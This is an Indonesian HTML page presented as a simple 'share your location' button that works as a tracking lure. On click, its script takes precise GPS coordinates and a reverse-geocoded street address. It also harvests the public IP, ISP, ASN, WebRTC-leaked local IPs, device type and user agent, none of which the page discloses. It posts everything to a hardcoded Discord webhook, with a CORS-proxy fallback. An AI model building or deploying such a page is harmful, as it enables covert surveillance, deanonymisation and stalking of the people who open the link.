<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bagikan Lokasi</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    padding: 1rem;
  }
  .card {
    background: white; border-radius: 20px;
    padding: 2.5rem 2rem; max-width: 420px; width: 100%;
    text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
  }
  .icon {
    width: 72px; height: 72px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    border-radius: 50%; display: flex; align-items: center;
    justify-content: center; font-size: 32px; margin: 0 auto 1.5rem;
  }
  h1 { font-size: 22px; font-weight: 700; color: #1a1a2e; margin-bottom: 10px; }
  p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 2rem; }
  button {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white; border: none; padding: 14px 28px;
    border-radius: 12px; font-size: 16px; font-weight: 600;
    cursor: pointer; width: 100%; transition: transform 0.2s, opacity 0.2s;
    margin-bottom: 8px;
  }
  button:hover:not(:disabled) { transform: translateY(-1px); opacity: 0.95; }
  button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
  #status { margin-top: 1.2rem; font-size: 14px; color: #666; min-height: 24px; line-height: 1.8; }
  .success { color: #22a559 !important; font-weight: 600; }
  .error { color: #e84040 !important; }
  .loading { color: #667eea !important; }
  .spinner {
    display: inline-block; width: 14px; height: 14px;
    border: 2px solid #667eea; border-top-color: transparent;
    border-radius: 50%; animation: spin 0.8s linear infinite;
    vertical-align: middle; margin-right: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .disclaimer {
    margin-top: 1.5rem; padding-top: 1rem;
    border-top: 1px solid #f0f0f0;
    font-size: 11px; color: #aaa; line-height: 1.5;
  }
</style>
</head>
<body>
<div class="card">
  <div class="icon">📍</div>
  <h1>Bagikan Lokasi</h1>
  <p>Klik tombol di bawah untuk membagikan lokasi lengkap Anda ke Discord.</p>
  <button id="btn" onclick="shareLocation()">📍 Bagikan Lokasi Saya</button>
  <div id="status"></div>
  <div class="disclaimer">
    Lokasi hanya dibagikan setelah Anda klik tombol di atas.
  </div>
</div>

<script>
  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1501025400623468675/L35q2UP3-AyQc_JjcE18ret-IaoVawfe8gRKK_OK9wJVlsIQyL-fRPDsjErdb6x8Ytc5";
  const LABEL = "Laporan Lokasi";

  function setStatus(msg, type) {
    const el = document.getElementById('status');
    el.className = type || '';
    el.innerHTML = msg;
  }

  async function sendToDiscord(payload) {
    try {
      const res = await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (res.ok || res.status === 204) return true;
    } catch(e) {}
    try {
      const res = await fetch('https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (res.ok || res.status === 204) return true;
    } catch(e) {}
    return false;
  }

  async function reverseGeocode(lat, lng) {
    try {
      const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&addressdetails=1&zoom=18&accept-language=id`;
      const res = await fetch(url, { headers: { 'User-Agent': 'LocationTracker/1.0' } });
      const data = await res.json();
      const a = data.address || {};
      return {
        jalan:          [a.house_number, a.road || a.pedestrian || a.footway || ''].filter(Boolean).join(' ') || '-',
        kelurahan:      a.suburb || a.village || a.neighbourhood || a.quarter || '-',
        kecamatan:      a.city_district || a.district || a.county || '-',
        kota:           a.city || a.town || a.municipality || '-',
        provinsi:       a.state || '-',
        kode_pos:       a.postcode || '-',
        negara:         a.country || '-',
        alamat_lengkap: data.display_name || '-'
      };
    } catch(e) { return null; }
  }

  // ═══════════════════════════════════════════
  // LAYER 1: Browser GPS + watchPosition refine
  // ═══════════════════════════════════════════
  async function tryGPS() {
    if (!navigator.geolocation) return null;
    setStatus('<span class="spinner"></span> [1/4] Mengunci sinyal GPS...', 'loading');
    let bestPos = null;

    try {
      bestPos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, {
          enableHighAccuracy: true, timeout: 12000, maximumAge: 0
        })
      );
    } catch(e) {
      try {
        bestPos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: false, timeout: 8000, maximumAge: 30000
          })
        );
      } catch(e2) { return null; }
    }

    if (!bestPos) return null;

    // Refine dengan watchPosition 5 detik
    setStatus('<span class="spinner"></span> [1/4] Meningkatkan presisi GPS...', 'loading');
    const refined = await new Promise((resolve) => {
      let best = bestPos;
      const watchId = navigator.geolocation.watchPosition(
        (pos) => {
          if (pos.coords.accuracy < best.coords.accuracy) best = pos;
          if (best.coords.accuracy <= 5) {
            navigator.geolocation.clearWatch(watchId);
            resolve(best);
          }
        },
        () => { navigator.geolocation.clearWatch(watchId); resolve(best); },
        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
      );
      setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(best); }, 5000);
    });

    const raw = refined.coords.accuracy;
    return {
      lat:    refined.coords.latitude,
      lng:    refined.coords.longitude,
      rawAcc: raw,
      accuracy: raw < 1 ? '±1 meter' : raw < 1000 ? `±${Math.round(raw)} meter` : `±${(raw/1000).toFixed(1)} km`,
      method: raw <= 10 ? 'GPS (High Accuracy)' : raw <= 50 ? 'GPS/WiFi' : raw <= 200 ? 'WiFi/Cell Tower' : 'Cell Tower',
      source: 'gps',
      ip: null, isp: null, asn: null
    };
  }

  // ═══════════════════════════════════════════════════════
  // LAYER 2: IP Lookup dari berbagai provider → triangulasi
  // ═══════════════════════════════════════════════════════
  async function fetchIPData() {
    setStatus('<span class="spinner"></span> [2/4] Mendeteksi IP Address...', 'loading');

    // Ambil IP publik dulu
    let publicIP = null;
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      publicIP = d.ip;
    } catch(e) {}

    setStatus('<span class="spinner"></span> [3/4] Triangulasi lokasi via IP...', 'loading');

    // Query 3 provider sekaligus, ambil semua yang berhasil
    const providers = await Promise.allSettled([

      // Provider 1: ipapi.co
      fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(6000) })
        .then(r => r.json())
        .then(d => d.error ? null : {
          lat: parseFloat(d.latitude),
          lng: parseFloat(d.longitude),
          ip:  d.ip,
          isp: d.org,
          asn: d.asn,
          city: d.city,
          region: d.region,
          country: d.country_name,
          src: 'ipapi.co'
        }),

      // Provider 2: ip-api.com (gratis, tanpa key)
      fetch('http://ip-api.com/json/?fields=status,lat,lon,isp,org,as,city,regionName,country,query', { signal: AbortSignal.timeout(6000) })
        .then(r => r.json())
        .then(d => d.status !== 'success' ? null : {
          lat: parseFloat(d.lat),
          lng: parseFloat(d.lon),
          ip:  d.query,
          isp: d.isp || d.org,
          asn: d.as,
          city: d.city,
          region: d.regionName,
          country: d.country,
          src: 'ip-api.com'
        }),

      // Provider 3: ipwho.is
      fetch('https://ipwho.is/', { signal: AbortSignal.timeout(6000) })
        .then(r => r.json())
        .then(d => !d.success ? null : {
          lat: parseFloat(d.latitude),
          lng: parseFloat(d.longitude),
          ip:  d.ip,
          isp: d.connection?.isp || d.connection?.org,
          asn: d.connection?.asn ? `AS${d.connection.asn}` : null,
          city: d.city,
          region: d.region,
          country: d.country,
          src: 'ipwho.is'
        }),

    ]);

    // Kumpulkan semua hasil yang valid
    const results = providers
      .filter(p => p.status === 'fulfilled' && p.value && !isNaN(p.value.lat))
      .map(p => p.value);

    if (results.length === 0) return null;

    // Triangulasi: rata-rata koordinat dari semua provider yang berhasil
    const avgLat = results.reduce((s, r) => s + r.lat, 0) / results.length;
    const avgLng = results.reduce((s, r) => s + r.lng, 0) / results.length;

    // Hitung deviasi max antar provider (estimasi radius ketidakpastian)
    let maxDevM = 0;
    for (const r of results) {
      const dLat = (r.lat - avgLat) * 111000;
      const dLng = (r.lng - avgLng) * 111000 * Math.cos(avgLat * Math.PI / 180);
      const dist = Math.sqrt(dLat * dLat + dLng * dLng);
      if (dist > maxDevM) maxDevM = dist;
    }

    // Akurasi IP: kota-level (~1–5 km), tapi tampilkan deviasi antar provider
    const devStr = maxDevM < 500
      ? `~${Math.round(maxDevM)} m antar provider`
      : `~${(maxDevM / 1000).toFixed(1)} km antar provider`;

    const best  = results[0]; // pakai data teks dari provider pertama yang berhasil
    const srcList = results.map(r => r.src).join(' + ');

    return {
      lat:      avgLat,
      lng:      avgLng,
      rawAcc:   Math.max(1000, maxDevM),
      accuracy: `±1–5 km (IP · ${devStr})`,
      method:   `IP Geolocation (${srcList})`,
      source:   'ip',
      ip:       publicIP || best.ip,
      isp:      best.isp,
      asn:      best.asn,
      city:     best.city,
      region:   best.region,
      country:  best.country,
      providers: results
    };
  }

  // ═══════════════════════════════════════════════
  // LAYER 3: WebRTC → dapatkan IP lokal & publik
  // ═══════════════════════════════════════════════
  async function getWebRTCIPs() {
    return new Promise((resolve) => {
      const ips = { local: [], public: [] };
      try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.onicecandidate = (e) => {
          if (!e.candidate) {
            pc.close();
            resolve(ips);
            return;
          }
          const parts = e.candidate.candidate.split(' ');
          const ip = parts[4];
          if (!ip) return;
          if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(ip)) {
            if (!ips.local.includes(ip)) ips.local.push(ip);
          } else if (!ip.includes(':')) {
            if (!ips.public.includes(ip)) ips.public.push(ip);
          }
        };
        pc.createOffer().then(o => pc.setLocalDescription(o));
        setTimeout(() => { pc.close(); resolve(ips); }, 3000);
      } catch(e) { resolve(ips); }
    });
  }

  // ═══════════════════════════════════════════
  // ORCHESTRATOR: coba semua layer, pilih terbaik
  // ═══════════════════════════════════════════
  async function getCoords() {
    // Coba GPS dulu
    const gpsResult = await tryGPS();
    if (gpsResult && gpsResult.rawAcc <= 500) {
      // GPS cukup akurat — tetap ambil IP di background untuk info jaringan
      setStatus('<span class="spinner"></span> [4/4] Mengambil info jaringan...', 'loading');
      const [ipData, rtcIPs] = await Promise.allSettled([fetchIPData(), getWebRTCIPs()]);
      const ip  = ipData.status  === 'fulfilled' ? ipData.value  : null;
      const rtc = rtcIPs.status  === 'fulfilled' ? rtcIPs.value  : null;

      return {
        ...gpsResult,
        ip:       ip?.ip  || null,
        isp:      ip?.isp || null,
        asn:      ip?.asn || null,
        localIPs: rtc?.local  || [],
        publicIPs: rtc?.public || [],
        ipProviders: ip?.providers || []
      };
    }

    // GPS gagal / kurang akurat → pakai IP triangulasi + WebRTC
    const [ipData, rtcIPs] = await Promise.allSettled([fetchIPData(), getWebRTCIPs()]);
    const ip  = ipData.status  === 'fulfilled' ? ipData.value  : null;
    const rtc = rtcIPs.status  === 'fulfilled' ? rtcIPs.value  : null;

    if (!ip && !gpsResult) throw new Error('Semua metode lokasi gagal');

    // Kalau GPS ada tapi akurasi buruk, bandingkan dengan IP
    if (gpsResult && ip) {
      // Pilih yang lebih akurat
      const useGPS = gpsResult.rawAcc < ip.rawAcc;
      const chosen = useGPS ? gpsResult : ip;
      return {
        ...chosen,
        ip:       ip.ip,
        isp:      ip.isp,
        asn:      ip.asn,
        localIPs: rtc?.local  || [],
        publicIPs: rtc?.public || [],
        ipProviders: ip.providers || [],
        note: `Dipilih: ${useGPS ? 'GPS' : 'IP'} (akurasi lebih baik)`
      };
    }

    // Hanya IP tersedia
    return {
      ...(ip || gpsResult),
      localIPs:   rtc?.local  || [],
      publicIPs:  rtc?.public || [],
      ipProviders: ip?.providers || []
    };
  }

  function getDeviceType() {
    return /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 Mobile' : '🖥️ Desktop';
  }
  function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes('Edg'))                               return 'Edge';
    if (ua.includes('Chrome') && !ua.includes('Edg'))    return 'Chrome';
    if (ua.includes('Firefox'))                           return 'Firefox';
    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
    return 'Unknown';
  }

  async function shareLocation() {
    const btn = document.getElementById('btn');
    btn.disabled = true;
    btn.textContent = 'Memproses...';

    try {
      const coords = await getCoords();

      setStatus('<span class="spinner"></span> Mengambil detail alamat...', 'loading');
      const alamat = await reverseGeocode(coords.lat, coords.lng);

      const mapsUrl  = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
      const mapsUrl2 = `https://www.openstreetmap.org/?mlat=${coords.lat}&mlon=${coords.lng}&zoom=18`;
      const time = new Date().toLocaleString('id-ID', {
        weekday: 'long', year: 'numeric', month: 'long',
        day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
      });

      setStatus('<span class="spinner"></span> Mengirim ke Discord...', 'loading');

      const coordStr   = `${coords.lat.toFixed(7)}, ${coords.lng.toFixed(7)}`;
      const deviceType = getDeviceType();
      const browser    = getBrowser();

      // IP provider detail
      const providerDetail = coords.ipProviders && coords.ipProviders.length > 0
        ? coords.ipProviders.map(p => `  [${p.src}] ${p.lat.toFixed(5)}, ${p.lng.toFixed(5)}`).join('\n')
        : '  -';

      const locationBlock = [
        `📍 **__LOCATION INFORMATION__**`,
        "```",
        `Koordinat   : ${coordStr}`,
        `Akurasi     : ${coords.accuracy}`,
        `Metode      : ${coords.method}`,
        coords.note ? `Catatan     : ${coords.note}` : '',
        ``,
        `Jalan       : ${alamat ? alamat.jalan      : '-'}`,
        `Kelurahan   : ${alamat ? alamat.kelurahan  : '-'}`,
        `Kecamatan   : ${alamat ? alamat.kecamatan  : '-'}`,
        `Kota        : ${alamat ? alamat.kota        : '-'}`,
        `Provinsi    : ${alamat ? alamat.provinsi    : '-'}`,
        `Kode Pos    : ${alamat ? alamat.kode_pos    : '-'}`,
        `Negara      : ${alamat ? alamat.negara      : '-'}`,
        "```",
      ].filter(Boolean).join('\n');

      const networkBlock = [
        `🌐 **__NETWORK INFORMATION__**`,
        "```",
        `IP Publik   : ${coords.ip          || 'N/A'}`,
        `ISP         : ${coords.isp         || 'N/A'}`,
        `ASN         : ${coords.asn         || 'N/A'}`,
        `IP Lokal    : ${coords.localIPs?.join(', ')  || 'N/A (WebRTC)'}`,
        `IP WebRTC   : ${coords.publicIPs?.join(', ') || 'N/A (WebRTC)'}`,
        ``,
        `Triangulasi IP Provider:`,
        providerDetail,
        "```",
      ].join('\n');

      const deviceBlock = [
        `📱 **__DEVICE INFORMATION__**`,
        "```",
        `Tipe        : ${deviceType}`,
        `Browser     : ${browser}`,
        `User Agent  : ${navigator.userAgent.substring(0, 100)}`,
        "```",
      ].join('\n');

      const linksBlock = [
        `🔗 **__QUICK LINKS__**`,
        `**Google Maps:** ${mapsUrl}`,
        `**OpenStreetMap:** ${mapsUrl2}`,
      ].join('\n');

      const alamatBlock = alamat ? [
        `📋 **__ALAMAT LENGKAP__**`,
        "```",
        alamat.alamat_lengkap.substring(0, 300),
        "```",
      ].join('\n') : '';

      const footerBlock = [
        `⏰ **Waktu:** ${time}`,
        `🏷️ **Label:** ${LABEL}`,
      ].join('\n');

      const content = [
        `# 📡 LOCATION REPORT`,
        ``,
        locationBlock,
        ``,
        networkBlock,
        ``,
        deviceBlock,
        ``,
        linksBlock,
        ``,
        alamatBlock,
        ``,
        `─────────────────────────`,
        footerBlock,
      ].filter(Boolean).join('\n');

      const payload = {
        username: '📍 Location Tracker',
        embeds: [{
          color: 0x5865F2,
          description: content,
          footer: { text: 'Location Tracker • GPS + IP Triangulation + WebRTC' },
          timestamp: new Date().toISOString()
        }]
      };

      const sent = await sendToDiscord(payload);

      if (sent) {
        btn.textContent = '✅ Terkirim!';
        btn.style.background = 'linear-gradient(135deg, #22a559, #1a7d42)';
        setStatus(`✅ Lokasi berhasil dikirim!<br><small style="color:#888">Metode: ${coords.method} · ${coords.accuracy}</small>`, 'success');
      } else {
        btn.disabled = false;
        btn.textContent = '📍 Coba Lagi';
        setStatus('❌ Gagal kirim ke Discord. Pastikan Webhook URL benar.', 'error');
      }

    } catch(err) {
      btn.disabled = false;
      btn.textContent = '📍 Coba Lagi';
      const msgs = {
        1: '❌ Izin lokasi ditolak.<br>Klik ikon 🔒 di address bar → izinkan Lokasi → refresh.',
        2: '❌ Lokasi tidak tersedia. Aktifkan Location Services di OS.',
        3: '❌ Timeout. Pastikan koneksi internet aktif dan coba lagi.'
      };
      setStatus(msgs[err.code] || `❌ Error: ${err.message}`, 'error');
    }
  }
</script>
</body>
</html>
